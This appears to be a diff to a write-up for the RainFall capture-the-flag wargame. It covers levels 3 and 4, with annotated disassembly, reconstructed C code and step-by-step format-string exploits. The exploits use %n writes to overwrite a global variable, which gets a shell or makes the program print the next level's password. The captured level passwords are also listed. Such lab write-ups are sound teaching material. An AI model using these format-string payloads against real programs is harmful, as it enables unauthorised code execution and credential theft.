@@ -463,13 +463,13 @@ Dump of assembler code for function v:
    0x080484cc <+40>:    lea    -0x208(%ebp),%eax ; Set eax to point to the 16th byte of the stack
    0x080484d2 <+46>:    mov    %eax,(%esp) ; Set eax as 1st argument of printf()
    0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
-   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to 0: printf "%x", *0x804988c -> "0" ; Also finds a function with this address, maybe a macro ?
+   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to m (= 0): printf "%x", *0x804988c -> "0"
    0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
    0x080484e2 <+62>:    jne    0x8048518 <v+116> ; If it\'s not the case, goto v+116 (return)
 
    0x080484e4 <+64>:    mov    0x8049880,%eax ; Set eax to stdout@@GLIBC_2.0
    0x080484e9 <+69>:    mov    %eax,%edx ; Set eax as 3rd argument of fwrite
-   0x080484eb <+71>:    mov    $0x8048600,%eax ; Set eax to 0x8048600 printf "%s", 0x8048600 -> Wait what?!
+   0x080484eb <+71>:    mov    $0x8048600,%eax ; Set eax to 0x8048600 printf "%s", 0x8048600 -> "Wait what?!"
    0x080484f0 <+76>:    mov    %edx,0xc(%esp) ; Set stdout@@GLIBC_2.0 as 4th argument
    0x080484f4 <+80>:    movl   $0xc,0x8(%esp) ; Set 3rd argument to 12
    0x080484fc <+88>:    movl   $0x1,0x4(%esp) ; Set 2nd argument to 1
@@ -502,20 +502,19 @@ Equivalent C code:
 // level3@RainFall:~$ cat /tmp/lol.c
 #include <stdio.h>
 
-# define z 0
+# define m 0
 
 void    v(void) {
-        unsigned int eax;
-        unsigned char buf[532];
+        unsigned char buf[536];
 
         fgets(buf + 520, 512, stdin);
-        eax = printf(buf + 520);
-        eax = z;
-        if (eax == 0x40)
+        printf(buf + 520);
+        if (m == 0x40)
         {
                 fwrite("Wait what?!\n", 1, 12, stdout);
                 system("/bin/sh");
         }
+        return ;
 }
 
 int     main(void) {
@@ -555,46 +554,70 @@ level3@RainFall:~$ ./level3 <<< 'AAAA %4$s'
 Segmentation fault (core dumped)
 ```
 
-We can read our own string ! Let's try to read return address to the printf() function call to `0x080484da`:
+We can read our own string !
+
+### Overwriting m
 
 ```bash
-gdb-peda$ disas v
-...
-   0x080484d2 <+46>:    mov    %eax,(%esp)
-   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
-   0x080484da <+54>:    mov    0x804988c,%eax
-...
+(gdb) info variables
+All defined variables:
+
+Non-debugging symbols:
+0x080485f8  _fp_hw
+0x080485fc  _IO_stdin_used
+0x08048734  __FRAME_END__
+0x08049738  __CTOR_LIST__
+0x08049738  __init_array_end
+0x08049738  __init_array_start
+0x0804973c  __CTOR_END__
+0x08049740  __DTOR_LIST__
+0x08049744  __DTOR_END__
+0x08049748  __JCR_END__
+0x08049748  __JCR_LIST__
+0x0804974c  _DYNAMIC
+0x08049818  _GLOBAL_OFFSET_TABLE_
+0x0804983c  __data_start
+0x0804983c  data_start
+0x08049840  __dso_handle
+0x08049860  stdin@@GLIBC_2.0
+0x08049880  stdout@@GLIBC_2.0
+0x08049884  completed.6159
+0x08049888  dtor_idx.6161
+[0x0804988c  m]
 ```
 
 ```bash
-gdb-peda$ b printf
-
-gdb-peda$ run <<< 'AAAA%4$x'
-
-gdb-peda$ si
-gdb-peda$ si # Pass ASM Prologue of printf
-
-gdb-peda$ x/100c $esp
-0xbffff4d0:     0x8     0xf7    0xff    0xbf    0xb0    0x26    0xff    0xb7
-0xbffff4d8:     0xc4    0x28    0xfd    0xb7    0x50    0x88    0xe7    0xb7
-0xbffff4e0:     0x0     0xf5    0xff    0xbf    0x18    0xf9    0xff    0xb7
-0xbffff4e8:     0xf4    0xf     0xfd    0xb7   [0xda    0x84    0x4     0x8] # return address
-0xbffff4f0:     0x0     0xf5    0xff    0xbf    0x0     0x2     0x0     0x0  # fgets() 16 bytes offset to end in stack
-0xbffff4f8:     0xc0    0x1a    0xfd    0xb7    0xd0    0x37    0xff    0xb7 # fgets() 16 bytes offset to end in stack
-0xbffff500:    [0x41    0x41    0x41    0x41]   0x25    0x34    0x24    0x78 # "AAAA%4$x"
-0xbffff508:     0xa     0x0     0x0     0x0     0x5     0xf3    0xfe    0xb7 # "\n\0\0\0", the newline added by the shell
-0xbffff510:     0x68    0xf5    0xff    0xbf    0xd4    0xe2    0xfd    0xb7
-0xbffff518:     0x34    0xe3    0xfd    0xb7    0x7     0x0     0x0     0x0
-0xbffff520:     0x0     0x0     0x0     0x0     0x0     0xe0    0xfd    0xb7
-0xbffff528:     0x3c    0xf5    0xff    0xb7    0x68    0xf5    0xff    0xbf
-0xbffff530:     0x40    0x0     0x0     0x0
-
-gdb-peda$ continue
-AAAA41414141
-[Inferior 1 (process 8495) exited normally]
+(gdb) print "%u", *0x804988c
+$3 = 0
 ```
 
-Or the return address of v & the offset with the beginning of the fgets input:
+```bash
+   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
+   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to m (= 0): printf "%x", *0x804988c -> "0"
+   0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
+```
+
+```bash
+level3@RainFall:~$ echo -n -e '\x0d\x86\x04\x08%4$s' > /tmp/input; ./level3  < /tmp/input | xxd
+0000000: 0d86 0408 2f62 696e 2f73 68              ..../bin/sh
+```
+
+```bash
+level3@RainFall:~$ echo -n -e '\x8c\x98\x04\x08''%60x%4$n' > /tmp/input
+
+level3@RainFall:~$ cat /tmp/input - | ./level3
+ls
+�                                                         200ls
+Wait what?!
+ls
+ls: cannot open directory .: Permission denied
+pwd
+/home/user/level3
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+### Rewriting EIP attempt
 
 ```bash
 level3@RainFall:~$ python -c "print 'A'*4" > /tmp/input; cat /tmp/input
@@ -669,8 +692,6 @@ level3@RainFall:~$ for i in $(seq 1 10); do echo -n "$i: "; echo -n -e "%$i\$x" 
 level3@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;) | grep 8048525
 135: 8048525
 ```
-
-### Rewriting EIP
 
 To make the program run the if() condition containing the system() call, we'll try to rewrite a saved EIP pointer,
 
@@ -819,6 +840,129 @@ level3@RainFall:~$ cat /tmp/input  | ./level3
 
 Todo: redact this
 
+## Level4
+
+- [`objdump -d` output](http://...)
+
+### ASM Interpretation
+
+```bash
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484a7 <+0>:	push   ebp
+   0x080484a8 <+1>:	mov    ebp,esp
+   0x080484aa <+3>:	and    esp,0xfffffff0
+   0x080484ad <+6>:	call   0x8048457 <n> ; n()
+   0x080484b2 <+11>:	leave
+   0x080484b3 <+12>:	ret
+End of assembler dump.
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x08048457 <+0>:	push   ebp
+   0x08048458 <+1>:	mov    ebp,esp
+   0x0804845a <+3>:	sub    esp,0x218 ; Allocate 0x218 (536) bytes on the stack
+   0x08048460 <+9>:	mov    eax,ds:0x8049804 ; exa to stdout@libc
+   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax ; Set 3st argument of fgets() to stdout
+   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200 ; Set 2nd argument of fgets() to 512
+   0x08048471 <+26>:	lea    eax,[ebp-0x208] ; Set 16th (520th last) byte of the stack to eax
+   0x08048477 <+32>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
+   0x0804847a <+35>:	call   0x8048350 <fgets@plt> ; fgets(ebp[-0x208 / -520] / (16th last byte of the stack), 0x200 / 512, stdout);
+   0x0804847f <+40>:	lea    eax,[ebp-0x208] ; Set eax to 16th (520th last) byte of the stack
+   0x08048485 <+46>:	mov    DWORD PTR [esp],eax ; Set eax as argument of p()
+   0x08048488 <+49>:	call   0x8048444 <p> ; Call p(eax) / p(&stack[16])
+   0x0804848d <+54>:	mov    eax,ds:0x8049810 ; printf "%u", *0x8049810 -> "0" ; // unsigned int m = 0;
+   0x08048492 <+59>:	cmp    eax,0x1025544 ; compare eax with 0x1025544 / 16930116 in decimal
+   0x08048497 <+64>:	jne    0x80484a5 <n+78> ; if not equal, goto return of the function
+   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590 ; (gdb) printf "%s", 0x8048590 -> "/bin/cat /home/user/level5/.pass"
+   0x080484a0 <+73>:	call   0x8048360 <system@plt> ; call system("/bin/cat /home/user/level5/.pass")
+   0x080484a5 <+78>:	leave
+   0x080484a6 <+79>:	ret
+
+(gdb)disas p
+Dump of assembler code for function p:
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	sub    esp,0x18 ; Allocate 24 bytes on the stack
+   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the first argument passed to p()
+   0x0804844d <+9>:	mov    DWORD PTR [esp],eax ; Set eax to the 1st argument of printf()
+   0x08048450 <+12>:	call   0x8048340 <printf@plt> ; call printf(eax)
+   0x08048455 <+17>:	leave
+   0x08048456 <+18>:	ret
+End of assembler dump.
+```
+
+### Equivalent C Code
+
+```c
+#include <stdio.h>
+
+unsigned int m = 0;
+
+void	p(void *fmt) {
+	printf(fmt);
+}
+
+void	n(void) {
+	unsigned char buffer[536];
+
+	fgets(&buffer[16], 512, stdout);
+	p(&buffer[16]);
+	if (m == 16930116) {
+		system("/bin/cat /home/user/level5/.pass");
+	}
+}
+
+int		main(int ac, char **av) {
+    n();
+}
+
+```
+
+### Walkthrough
+
+```bash
+level4@RainFall:~$ python -c 'print "%x "*50' > /tmp/lol
+
+level4@RainFall:~$ gdb ./level4
+(gdb) run < /tmp/lol
+b7ff26b0 bffff6d4 b7fd0ff4 [0 0] bffff698 804848d bffff490 200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 ....
+
+# We can think our m global variable is one of these two zeros
+
+level4@RainFall:~$ echo -n -e '\x42\x42\x42\x42%4$s' >  /tmp/lol ; cat /tmp/lol | ./level4  | xxd
+0000000: 4242 4242 286e 756c 6c29                 BBBB(null) # The program should segfault by reading the address 0x42424242 after printing BBBB
+
+
+# Let's do a quick for to find the real offset of the string passed to p()
+level4@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "BBBB%$i\$x" | ./level4; echo; done;) | grep 42424242
+12: BBBB42424242
+
+# Try again ...
+level4@RainFall:~$ echo -n -e '\x42\x42\x42\x42%12$s' >  /tmp/lol ; cat /tmp/lol | ./level4
+Segmentation fault (core dumped)
+
+
+level4@RainFall:~$ echo -n -e '\x10\x98\x04\x08%12$n' >  /tmp/lol ; cat /tmp/lol | ./level4  | xxd
+0000000: 1098 0408                                ....
+
+level4@RainFall:~$ gdb ./level4
+
+(gdb) b *0x08048492
+Breakpoint 1 at 0x8048492
+
+(gdb) run < /tmp/lol
+Starting program: /home/user/level4/level4 < /tmp/lol
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) printf "%u", *0x8049810
+4
+
+# The value of m got modified by the %n operator ! Now let's give it the value of the comparison (16930116) by printing 16930112 more characters
+echo -n -e '\x10\x98\x04\x08%16930112x%12$n' >  /tmp/lol ; cat /tmp/lol - | ./level4
+# Should print a lot of spaces .... and then
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
 
 ## Misc / References
 
@@ -884,4 +1028,11 @@ bonus1:x:2011:2011::/home/user/bonus1:/bin/bash
 bonus2:x:2012:2012::/home/user/bonus2:/bin/bash
 bonus3:x:2013:2013::/home/user/bonus3:/bin/bash
 end:x:2014:2014::/home/user/end:/bin/bash
+```
+
+### Passwords
+
+```bash
+level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
